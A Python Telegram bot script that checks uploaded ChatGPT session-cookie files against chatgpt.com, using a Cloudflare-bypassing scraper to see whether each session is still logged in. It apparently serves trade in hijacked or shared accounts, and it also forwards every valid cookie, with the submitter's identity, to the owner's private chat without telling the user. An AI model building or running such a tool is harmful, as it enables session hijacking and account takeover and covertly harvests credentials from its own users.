#!/usr/bin/env python3
import os
import io
import json
import zipfile
import logging
import re
import asyncio
from datetime import datetime, timezone

import pycountry
import langcodes
import cloudscraper
import certifi
from dotenv import load_dotenv
from telegram import Update, Document, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# Load environment variables
load_dotenv()
TELEGRAM_TOKEN       = os.getenv("TELEGRAM_TOKEN")
OWNER_CHAT_ID        = os.getenv("OWNER_CHAT_ID")
CHANNEL_CHAT_ID      = os.getenv("CHANNEL_CHAT_ID")
CHANNEL_INVITE_LINK  = os.getenv("CHANNEL_INVITE_LINK")
if not (TELEGRAM_TOKEN and OWNER_CHAT_ID and CHANNEL_CHAT_ID and CHANNEL_INVITE_LINK):
    logging.error("Please set TELEGRAM_TOKEN, OWNER_CHAT_ID, CHANNEL_CHAT_ID, and CHANNEL_INVITE_LINK in your .env")
    exit(1)
OWNER_CHAT_ID   = int(OWNER_CHAT_ID)
CHANNEL_CHAT_ID = int(CHANNEL_CHAT_ID)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def get_channel_invite_link(context):
    return CHANNEL_INVITE_LINK

def parse_cookies(file_content: str, file_type: str) -> dict:
    # support JSON array, Netscape format, or "k=v; k2=v2"
    if file_type.lower() == 'json' or file_content.lstrip().startswith('['):
        try:
            arr = json.loads(file_content)
            if isinstance(arr, list):
                return {c['name']: c['value'] for c in arr if 'name' in c and 'value' in c}
        except json.JSONDecodeError:
            pass

    cookies = {}
    for line in file_content.splitlines():
        line = line.strip()
        if not line or (line.startswith('#') and not line.startswith('#HttpOnly_')):
            continue
        if line.startswith('#HttpOnly_'):
            line = line[len('#HttpOnly_'):]
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]

    if not cookies and file_content.strip():
        for pair in file_content.split(';'):
            if '=' in pair:
                k, v = pair.strip().split('=', 1)
                cookies[k] = v

    return cookies

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    user_id = user.id
    full_name = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
    try:
        member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user_id)
        if member.status in ('member','administrator','creator'):
            await update.message.reply_text(
                f"👋 Hi {full_name}! Send me your ChatGPT‐cookies file(s) (.txt, .json, or .zip), and I’ll check whether they’re still valid.",
                reply_to_message_id=update.message.message_id
            )
            return
    except:
        pass

    invite = await get_channel_invite_link(context)
    kb = [[InlineKeyboardButton("Join our channel", url=invite)]]
    await update.message.reply_text(
        f"👋 Hi {full_name}! Please join our channel to use this bot.",
        reply_markup=InlineKeyboardMarkup(kb),
        reply_to_message_id=update.message.message_id
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc: Document = update.message.document
    orig_id = update.message.message_id
    user = update.message.from_user
    user_id = user.id
    full_name = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
    username_str = f"@{user.username}" if user.username else "N/A"

    # enforce channel membership
    try:
        member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user_id)
        if member.status not in ('member','administrator','creator'):
            raise Exception()
    except:
        invite = await get_channel_invite_link(context)
        kb = [[InlineKeyboardButton("Join our channel", url=invite)]]
        return await update.message.reply_text(
            f"👋 Hi {full_name}! Please join our channel to use this bot.",
            reply_markup=InlineKeyboardMarkup(kb),
            reply_to_message_id=orig_id
        )

    file = await doc.get_file()
    data = await file.download_as_bytearray()
    buf = io.BytesIO(data)

    fn = doc.file_name
    ext = os.path.splitext(fn)[1].lower()
    cookie_files = []

    if ext in ('.txt','.json'):
        txt = buf.read().decode('utf-8','ignore')
        cookie_files.append((fn, txt, ext.lstrip('.')))
    elif ext == '.zip':
        with zipfile.ZipFile(buf) as zf:
            for zi in zf.infolist():
                base = os.path.basename(zi.filename)
                if zi.filename.startswith('__MACOSX/') or base.startswith('._'):
                    continue
                if zi.filename.lower().endswith(('.txt','.json')):
                    txt = zf.read(zi).decode('utf-8','ignore')
                    cookie_files.append((zi.filename, txt, zi.filename.split('.')[-1]))
    else:
        return await update.message.reply_text("⚠️ Unsupported file type. Use .txt, .json or .zip.", reply_to_message_id=orig_id)

    if not cookie_files:
        return await update.message.reply_text("🚫 No .txt/.json cookie files found.", reply_to_message_id=orig_id)

    for name, content, ftype in cookie_files:
        context.application.create_task(
            process_file(
                chat_id=update.effective_chat.id,
                orig_id=orig_id,
                name=name,
                content=content,
                ftype=ftype,
                bot_user=context.bot.username,
                user_id=user_id,
                full_name=full_name,
                username_str=username_str,
                context=context
            )
        )

async def process_file(
    chat_id:int,
    orig_id:int,
    name:str,
    content:str,
    ftype:str,
    bot_user:str,
    user_id:int,
    full_name:str,
    username_str:str,
    context:ContextTypes.DEFAULT_TYPE
):
    cookies = parse_cookies(content, ftype)
    if not cookies:
        return await context.bot.send_message(chat_id, "⚠️ Invalid cookie format.", reply_to_message_id=orig_id)

    # build a CloudScraper session
    scraper = cloudscraper.create_scraper(browser={'browser':'chrome','platform':'windows'})
    scraper.verify = certifi.where()
    scraper.cookies.update(cookies)

    try:
        loop = asyncio.get_running_loop()
        resp = await loop.run_in_executor(None, scraper.get, "https://chatgpt.com")
        html = resp.text

        # extract the JS payload string inside enqueue("…")
        m = re.search(r'streamController\.enqueue\("(.+?)"\)', html, re.DOTALL)
        if m:
            js_escaped = m.group(1)
            # decode \" → "
            try:
                js_payload = js_escaped.encode('utf-8').decode('unicode_escape')
            except:
                js_payload = js_escaped
            if '"authStatus","logged_in"' in js_payload:
                valid = True
            elif '"authStatus","logged_out"' in js_payload:
                valid = False
            else:
                valid = False
        else:
            valid = False
    except Exception as e:
        logger.error(f"Error fetching ChatGPT: {e}")
        valid = False

    # prepare reply file
    buf2 = io.BytesIO(content.encode('utf-8'))
    buf2.seek(0)
    ext = os.path.splitext(name)[1].lower()
    tag = f"@{bot_user}-{orig_id}{ext}"
    input_file = InputFile(buf2, filename=tag)

    if valid:
        await context.bot.send_document(
            chat_id,
            document=input_file,
            caption=f"✅ This cookie is working, enjoy ChatGPT 🤖. Checked by @{bot_user}",
            reply_to_message_id=orig_id
        )
        await context.bot.send_document(
            OWNER_CHAT_ID,
            document=input_file,
            caption=(
                f"Chat ID: <a href=\"tg://user?id={user_id}\">{user_id}</a>\n"
                f"Full name: {full_name}\n"
                f"Username: {username_str}\n\n"
                "✅ Cookie valid (authStatus=logged_in)."
            ),
            parse_mode='HTML'
        )
    else:
        await context.bot.send_message(
            chat_id,
            text="❌ This cookie is invalid or expired (authStatus=logged_out).",
            reply_to_message_id=orig_id
        )

def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, handle_document))
    app.run_polling()
    logger.info("Bot started.")

if __name__ == "__main__":
    main()
